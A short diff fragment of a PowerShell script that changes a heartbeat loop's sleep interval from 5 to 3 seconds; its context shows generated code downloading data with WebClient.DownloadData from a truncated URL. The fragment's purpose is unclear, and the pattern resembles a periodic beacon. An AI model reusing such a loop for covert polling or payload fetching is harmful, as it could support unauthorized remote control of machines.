@@ -311,7 +311,7 @@ try { `$Web = New-Object System.Net.WebClient; `$ImgBytes = `$Web.DownloadData('
         } catch {
             Log-Message "Heartbeat Error: $($_.Exception.Message)"
         }
-        Start-Sleep -Seconds 5
+        Start-Sleep -Seconds 3
     }
 } catch {
     Log-Message "CRITICAL ERROR: $_"
